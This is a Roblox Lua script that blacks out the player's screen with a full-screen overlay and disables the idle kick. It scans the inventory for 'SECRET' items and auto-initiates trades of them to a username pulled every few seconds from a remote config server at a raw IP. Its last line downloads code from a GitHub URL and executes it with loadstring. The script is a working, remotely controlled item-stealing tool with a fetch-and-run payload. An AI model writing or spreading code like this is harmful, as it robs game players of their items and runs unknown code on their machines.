-- ======================================================
-- ULTIMATE WEB-CONTROLLED OVERLAY: AUTO TRADE ACTIVE
-- [DISTANCE < 5M + SECRET SYNC + REAL TRADE INITIATE]
-- ======================================================

local CONFIG_URL = "http://165.232.148.115:5000/config.json" --

-- ===============================
-- 1. GLOBAL SERVICES & HELPERS
-- ===============================
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local lp = Players.LocalPlayer

-- ANTI-AFK
pcall(function()
    for _, v in pairs(getconnections(lp.Idled)) do
        if v.Disable then v:Disable() end
    end
end)

-- ===============================
-- 2. UI OVERLAY CONSTRUCTION
-- ===============================
if CoreGui:FindFirstChild("MainOverlayGui") then CoreGui.MainOverlayGui:Destroy() end
local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "MainOverlayGui"
ScreenGui.IgnoreGuiInset = true 
ScreenGui.DisplayOrder = 9999

local Background = Instance.new("Frame", ScreenGui)
Background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Background.Size = UDim2.new(1, 0, 1, 0)
Background.BorderSizePixel = 0

local ContentFrame = Instance.new("Frame", Background)
ContentFrame.AnchorPoint = Vector2.new(0.5, 0.5)
ContentFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
ContentFrame.Size = UDim2.new(0.9, 0, 0.7, 0)
ContentFrame.BackgroundTransparency = 1
Instance.new("UIListLayout", ContentFrame).HorizontalAlignment = Enum.HorizontalAlignment.Center

local function CreateLabel(name, color)
    local label = Instance.new("TextLabel", ContentFrame)
    label.BackgroundTransparency = 1
    label.Size = UDim2.new(1, 0, 0, 35)
    label.Font = Enum.Font.GothamBold
    label.TextColor3 = color or Color3.fromRGB(255, 255, 255)
    label.TextSize = 22
    label.Text = "Connecting..."
    return label
end

local SecretLabel = CreateLabel("SecretLabel", Color3.fromRGB(255, 215, 0))
local DistanceLabel = CreateLabel("DistanceLabel", Color3.fromRGB(80, 255, 80))

local ToggleBtn = Instance.new("TextButton", ScreenGui)
ToggleBtn.Size = UDim2.fromOffset(40, 40)
ToggleBtn.Position = UDim2.new(0, 10, 0, 10)
ToggleBtn.Text = "ðŸ‘ï¸"
ToggleBtn.ZIndex = 10000
Instance.new("UICorner", ToggleBtn).CornerRadius = UDim.new(1, 0)
ToggleBtn.MouseButton1Click:Connect(function()
    Background.Visible = not Background.Visible
    ToggleBtn.Text = Background.Visible and "ðŸ‘ï¸" or "âŒ"
end)

-- ===============================
-- 3. ADVANCED DETECTION LOGIC
-- ===============================
local Replion = require(ReplicatedStorage.Packages.Replion).Client
local ItemUtility = require(ReplicatedStorage.Shared.ItemUtility)
local TierUtility = require(ReplicatedStorage.Shared.TierUtility)
local PlayerData = Replion:WaitReplion("Data", 10)

local TradingConfig = { AutoTrade = false, TargetUsername = "", TargetId = nil, Delay = 6.0 }
local GlobalSecretUUIDs = {}
local CurrentDistanceMeters = 999
local TradingThread = nil

local function GetRemote(name)
    local p = {"Packages", "_Index", "sleitnick_net@0.2.0", "net"}
    local c = ReplicatedStorage
    for _, v in ipairs(p) do c = c:WaitForChild(v, 2) end
    return c:FindFirstChild(name)
end

local function GetFishRarity(item) --
    local rarity = item.Metadata and item.Metadata.Rarity or "COMMON"
    local itemID = item.Id
    if ItemUtility and itemID then
        pcall(function()
            local data = ItemUtility:GetItemData(itemID)
            if not data then
                local numID = tonumber(item.Id) or tonumber(item.Identifier)
                if numID then data = ItemUtility:GetItemData(numID) end
            end
            if data and data.Probability and TierUtility then
                local tier = TierUtility:GetTierFromRarity(data.Probability.Chance)
                if tier and tier.Name then rarity = tier.Name end
            end
        end)
    end
    return tostring(rarity):upper()
end

-- ===============================
-- 4. INVENTORY SYNC (15S)
-- ===============================
task.spawn(function()
    while true do
        local uuids = {}
        pcall(function()
            local inv = PlayerData:GetExpect("Inventory")
            if inv then
                for _, category in pairs(inv) do
                    if type(category) == "table" then
                        for _, item in ipairs(category) do
                            if GetFishRarity(item) == "SECRET" then
                                table.insert(uuids, item.UUID)
                            end
                        end
                    end
                end
            end
        end)
        GlobalSecretUUIDs = uuids
        SecretLabel.Text = "Total Secrets: " .. tostring(#GlobalSecretUUIDs)
        task.wait(15)
    end
end)

-- ===============================
-- 5. RANGE TRACKER < 5M
-- ===============================
RunService.RenderStepped:Connect(function()
    local target = Players:FindFirstChild(TradingConfig.TargetUsername)
    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        local myRoot = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
        if myRoot then
            local mag = (myRoot.Position - target.Character.HumanoidRootPart.Position).Magnitude
            CurrentDistanceMeters = mag / 3.5 
            DistanceLabel.Text = string.format("ðŸ“ %s: %.1f m", target.Name, CurrentDistanceMeters)
            DistanceLabel.TextColor3 = (CurrentDistanceMeters < 5.0) and Color3.fromRGB(80, 255, 80) or Color3.fromRGB(255, 80, 80)
        end
    else
        DistanceLabel.Text = "ðŸ“ " .. TradingConfig.TargetUsername .. ": Offline/Loading"
        CurrentDistanceMeters = 999
    end
end)

-- ===============================
-- 6. REAL TRADE LOGIC (FIXED)
-- ===============================
local function RunAutoTrade()
    if TradingThread then task.cancel(TradingThread) end
    TradingThread = task.spawn(function()
        local RF_InitiateTrade = GetRemote("RF/InitiateTrade")
        while TradingConfig.AutoTrade do
            -- Cek Jarak < 5m & Secret > 0
            if CurrentDistanceMeters < 5.0 then
                if #GlobalSecretUUIDs > 0 then
                    local targetPlayer = Players:FindFirstChild(TradingConfig.TargetUsername)
                    if targetPlayer and RF_InitiateTrade then
                        local itemToTrade = GlobalSecretUUIDs[1]
                        print("[Trade] Distance OK ("..math.floor(CurrentDistanceMeters).."m). Initiating Trade for UUID: "..itemToTrade)
                        -- EKSEKUSI TRADE KE SERVER
                        pcall(function()
                            RF_InitiateTrade:InvokeServer(targetPlayer.UserId, itemToTrade)
                        end)
                    end
                end
            end
            task.wait(TradingConfig.Delay)
        end
        TradingThread = nil
    end)
end

-- ===============================
-- 7. WEB CONFIG UPDATER
-- ===============================
task.spawn(function()
    local lastRaw = ""
    while true do
        local success, res = pcall(function() return game:HttpGet(CONFIG_URL) end)
        if success and res ~= lastRaw then
            local ds, data = pcall(function() return HttpService:JSONDecode(res) end)
            if ds and data.TradingConfig then
                lastRaw = res
                TradingConfig.AutoTrade = data.TradingConfig.AutoTrade
                TradingConfig.TargetUsername = data.TradingConfig.TargetUsername
                TradingConfig.Delay = data.TradingConfig.Delay or 6.0
                
                if TradingConfig.AutoTrade and not TradingThread then RunAutoTrade() end
            end
        end
        task.wait(10)
    end
end)

print("[System] Auto Trade Final Version Running.")
loadstring(game:HttpGet("https://raw.githubusercontent.com/abinoldi/muffinz/refs/heads/main/tormoni"))()
